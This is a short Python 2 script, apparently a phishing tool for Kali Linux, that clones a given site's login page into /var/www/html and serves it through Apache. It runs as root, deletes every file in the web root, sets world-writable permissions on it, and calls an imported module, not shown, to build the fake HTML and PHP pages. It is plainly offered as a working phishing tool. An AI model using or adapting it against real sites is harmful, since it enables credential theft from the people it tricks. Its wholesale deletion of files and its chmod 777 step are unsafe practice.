# Date: 08/16/2017
# Distro: Kali Linux
# Author: Ethical-H4CK3R
# Description: Creates phishing sites
#
#

import os
import create
import argparse
import subprocess

class Phish(create.Create):
 def __init__(self):
  self.dir = '/var/www/html'
  super(Phish,self).__init__()

 def remove(self):
  for item in os.listdir(self.dir):
   if os.path.isfile('{}/{}'.format(self.dir,item)):
    os.remove('{}/{}'.format(self.dir,item))

 def apache(self):
  cmd = ['service','apache2','restart']
  subprocess.Popen(cmd).wait()
  print '\n[-] Started apache web server'
 def permission(self):
  cmd = ['chmod','777','-R',self.dir]
  subprocess.Popen(cmd).wait()

 def clone(self,url):
  os.chdir(self.dir) # webserver directory
  self.remove()

  self.html(url)
  self.php()

  self.permission() # a certain permission is required
  self.apache()

def main():
 arg = argparse.ArgumentParser()
 arg.add_argument('url',help='site\'s login page')
 arg = arg.parse_args()
 Phish().clone(arg.url)
 print 'Check: /var/www/html'

if __name__ == '__main__':
 if os.getuid():exit('root access required')
 main()
